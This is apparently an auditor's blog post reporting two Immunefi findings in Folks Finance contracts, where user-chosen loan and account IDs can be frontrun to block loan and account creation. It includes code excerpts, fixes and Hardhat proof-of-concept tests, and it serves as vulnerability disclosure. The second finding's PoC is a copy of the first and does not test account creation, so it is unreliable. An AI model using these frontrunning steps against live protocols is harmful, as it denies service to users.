# The Concept

Inbetween my normal audits, when there is a lot of free time, I thought to take a quick look at other ongoing audits and see if I can find anything on my 1st or 2nd pass of the codebase. I do this as a small challenge to make me pay more attention on my 1st and 2nd passes of the code.

Why?

- Improve my initial look at a codebase.
- Slightly boost my leaderboard rank on different audit platforms.
- Slightly boost my valid findings ratio on different audit platforms.
- Potentially make a small amount of extra money, although most bugs found on the 1st and 2nd pass will be heavily duplicated.
- Get a decent idea of codebases so after I can read the reports and understand them.
- Expose myself to different coding techniques and ideas.

# The results

### Folks Finance - Immunefi - 212,89 USDC

<details>
<summary>[M-01] - Loan creation can be frontrun, preventing the users from creating loans</summary>

## Brief/Intro

A user who tries to create a loan has to choose the `loanId`. Any user can frontrun this transaction with the same `loanId`, making the initial user's transaction to revert because his selected `loanId` is taken.

## Vulnerability Details

Each loan has a unique `bytes32` identifier named `loanId`. During the loan creation, each user is asked to provide the `loanId` that his loan will have.

```javascript
SpokeCommon.sol

    function createLoan(
        Messages.MessageParams memory params,
        bytes32 accountId,
@>      bytes32 loanId,
        uint16 loanTypeId,
        bytes32 loanName
    ) external payable nonReentrant {
        _doOperation(params, Messages.Action.CreateLoan, accountId, abi.encodePacked(loanId, loanTypeId, loanName));
    }
```

```javascript
SpokeToken.sol

    function createLoanAndDeposit(
        Messages.MessageParams memory params,
        bytes32 accountId,
@>      bytes32 loanId,
        uint256 amount,
        uint16 loanTypeId,
        bytes32 loanName
    ) external payable nonReentrant {
        _doOperation(
            params,
            Messages.Action.CreateLoanAndDeposit,
            accountId,
            amount,
            abi.encodePacked(loanId, poolId, amount, loanTypeId, loanName)
        );
    }
```

This arbitrary `loanId` value is sent through a bridge to the `Hub.sol` contract which in turn calls the `createUserLoan` function is `LoanManager.sol`.

```javascript
Hub.sol

    function _receiveMessage(Messages.MessageReceived memory message) internal override {
        Messages.MessagePayload memory payload = Messages.decodeActionPayload(message.payload);
        .
        .
        .
        } else if (payload.action == Messages.Action.CreateLoan) {
            bytes32 loanId = payload.data.toBytes32(index);
            index += 32;
            uint16 loanTypeId = payload.data.toUint16(index);
            index += 2;
            bytes32 loanName = payload.data.toBytes32(index);

@>          loanManager.createUserLoan(loanId, payload.accountId, loanTypeId, loanName);
        } else if (payload.action == Messages.Action.DeleteLoan) {
            bytes32 loanId = payload.data.toBytes32(index);

            loanManager.deleteUserLoan(loanId, payload.accountId);
        } else if (payload.action == Messages.Action.CreateLoanAndDeposit) {
            bytes32 loanId = payload.data.toBytes32(index);
            index += 32;
            uint8 poolId = payload.data.toUint8(index);
            index += 1;
            uint256 amount = payload.data.toUint256(index);
            index += 32;
            uint16 loanTypeId = payload.data.toUint16(index);
            index += 2;
            bytes32 loanName = payload.data.toBytes32(index);

@>          loanManager.createUserLoan(loanId, payload.accountId, loanTypeId, loanName);
            loanManager.deposit(loanId, payload.accountId, poolId, amount);

            // save token received
            receiveToken = ReceiveToken({poolId: poolId, amount: amount});
        } else if (payload.action == Messages.Action.Deposit) {
        .
        .
        .
```

```javascript
LoanManager.sol

    function createUserLoan(
        bytes32 loanId,
        bytes32 accountId,
        uint16 loanTypeId,
        bytes32 loanName
    ) external override onlyRole(HUB_ROLE) nonReentrant {
        // check loan types exists, is not deprecated and no existing user loan for same loan id
        if (!isLoanTypeCreated(loanTypeId)) revert LoanTypeUnknown(loanTypeId);
        if (isLoanTypeDeprecated(loanTypeId)) revert LoanTypeDeprecated(loanTypeId);
@>      if (isUserLoanActive(loanId)) revert UserLoanAlreadyCreated(loanId);

        // create loan
        UserLoan storage userLoan = _userLoans[loanId];
        userLoan.isActive = true;
        userLoan.accountId = accountId;
        userLoan.loanTypeId = loanTypeId;

        emit CreateUserLoan(loanId, accountId, loanTypeId, loanName);
    }
```

At this point, if there is already a loan with the desired `loanId`, the transaction reverts. Upon a valid loan creation, a new `UserLoan` object is created and `UserLoan.isActive` is set to `true`.

```javascript
    function isUserLoanActive(bytes32 loanId) public view returns (bool) {
        return _userLoans[loanId].isActive;
    }
```

An attacker can take advantage of this and frontrun all the loan creation transactions (on the chains with a public mempool, like the `Ethereum mainnet`) and prevent all the users from creating loans.

## Impact Details

This is a griefing attack which prevents all users from creating loans. Every transaction will fail because the attacker can frontrun it with the same `loanId`.

## References

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/spoke/SpokeCommon.sol#L115

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/spoke/SpokeToken.sol#L46

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/Hub.sol#L186-L210

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManager.sol#L40

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/LoanManagerState.sol#L413

## Recommendation

Don't allow for the users to select their desired `loanId`. Use a counter internally and increment it with every loan creation and use it as the `loanId`.


## Proof of Concept

Let's follow this scenario:

1. Bob tries to create a loan with a random `loanId`
2. Alice (the attacker) sees this transaction in the mempool and frontruns bob transaction with the same `loanId`
3. Alice's transaction goes through
4. Bob's transaction gets reverted
5. Repeat

Paste the following test in the `test/hub/LoanManager.test.ts`:

```javascript
  describe("POCs", () => {
    it("Should test loanId frontrun", async () => {
      const { hub, loanManager } = await loadFixture(deployLoanManagerFixture);
      const { loanTypeId } = await loadFixture(addPoolsFixture);

      const loanId = getRandomBytes(BYTES32_LENGTH);
      const accountId1 = getAccountIdBytes("ACCOUNT_ID");
      const accountId2 = getAccountIdBytes("ACCOUNT_ID2");
      const loanName = getRandomBytes(BYTES32_LENGTH);

      // frontrunning transaction
      const createUserLoan2 = await loanManager.connect(hub).createUserLoan(loanId, accountId2, loanTypeId, loanName);

      // initial transaction
      const createUserLoan = loanManager.connect(hub).createUserLoan(loanId, accountId1, loanTypeId, loanName);

      await expect(createUserLoan)
        .to.be.revertedWithCustomError(loanManager, "UserLoanAlreadyCreated")
        .withArgs(loanId);
    });


  });
```

</details>

<details>
<summary>[M-02] - Account creation can be frontrun, making the users unable to create an account</summary>

## Brief/Intro

A user who tries to create an account for the protocol has to choose his `accountId`. Any user can frontrun this transaction with the same `accountId`, making the initial user's transaction to revert because his selected `accountId` is taken.

## Vulnerability Details

Each account has a unique `bytes32` identifier named `accountId`. During the account creation, each user is asked to provide the `accountId` that his account will have.

```javascript
SpokeCommon.sol

    function createAccount(
        Messages.MessageParams memory params,
@>      bytes32 accountId,
        bytes32 refAccountId
    ) external payable nonReentrant {
        _doOperation(params, Messages.Action.CreateAccount, accountId, abi.encodePacked(refAccountId));
    }
```

This arbitrary `accountId` value is sent through a bridge to the `Hub.sol` contract which in turn calls the createAccount function is `AccountManager.sol`.

```javascript
Hub.sol

    function _receiveMessage(Messages.MessageReceived memory message) internal override {
        Messages.MessagePayload memory payload = Messages.decodeActionPayload(message.payload);
        .
        .
        .
        if (payload.action == Messages.Action.CreateAccount) {
            bytes32 refAccountId = payload.data.toBytes32(index);

@>          accountManager.createAccount(payload.accountId, message.sourceChainId, payload.userAddress, refAccountId);
        } else if
        .
        .
        .
    }
```

```javascript
AccountManager.sol

    function createAccount(
        bytes32 accountId,
        uint16 chainId,
        bytes32 addr,
        bytes32 refAccountId
    ) external override onlyRole(HUB_ROLE) {
        // check account is not already created (empty is reserved for admin)
@>      if (isAccountCreated(accountId) || accountId == bytes32(0)) revert AccountAlreadyCreated(accountId);
        .
        .
        .
    }
```

At this point, if there is already an account with the desired `accountId`, the transaction reverts. An attacker can take advantage of this and frontrun all the account creation transactions (on the chains with a public mempool, like the `Ethereum mainnet`) and prevent all the users from creating an account, which is essential for someone to use the protocol.

## Impact Details

This is a griefing attack which prevents any new users from using the protocol, since they can't create an account. Every transaction will fail because the attacker can frontrun it with the same `accountId`.

## References

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/spoke/SpokeCommon.sol#L27

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/Hub.sol#L163

https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/main/contracts/hub/AccountManager.sol#L42

## Recommendation

Don't allow for the users to select their desired `accountId`. Use a counter internally and increment it with every account creation and use it as the `accountId`.


## Proof of Concept

Let's follow this scenario:

1. Bob tries to create an account with `accountId = "BOB_ACCOUNT_ID"`
2. Alice (the attacker) sees this transaction in the mempool and frontruns bob transaction with `accountId = "BOB_ACCOUNT_ID"`
3. Alice's transaction goes through
4. Bob's transaction gets reverted
5. Repeat

Add the following test in the `test/AccountManager.test.ts` file under the `describe("Create Account", () => {` tab.

```javascript
  describe("POCs", () => {
    it("Should test loanId frontrun", async () => {
      const { hub, loanManager } = await loadFixture(deployLoanManagerFixture);
      const { loanTypeId } = await loadFixture(addPoolsFixture);

      const loanId = getRandomBytes(BYTES32_LENGTH);
      const accountId1 = getAccountIdBytes("ACCOUNT_ID");
      const accountId2 = getAccountIdBytes("ACCOUNT_ID2");
      const loanName = getRandomBytes(BYTES32_LENGTH);

      // frontrunning transaction
      const createUserLoan2 = await loanManager.connect(hub).createUserLoan(loanId, accountId2, loanTypeId, loanName);

      // initial transaction
      const createUserLoan = loanManager.connect(hub).createUserLoan(loanId, accountId1, loanTypeId, loanName);

      await expect(createUserLoan)
        .to.be.revertedWithCustomError(loanManager, "UserLoanAlreadyCreated")
        .withArgs(loanId);
    });


  });
```

</details>
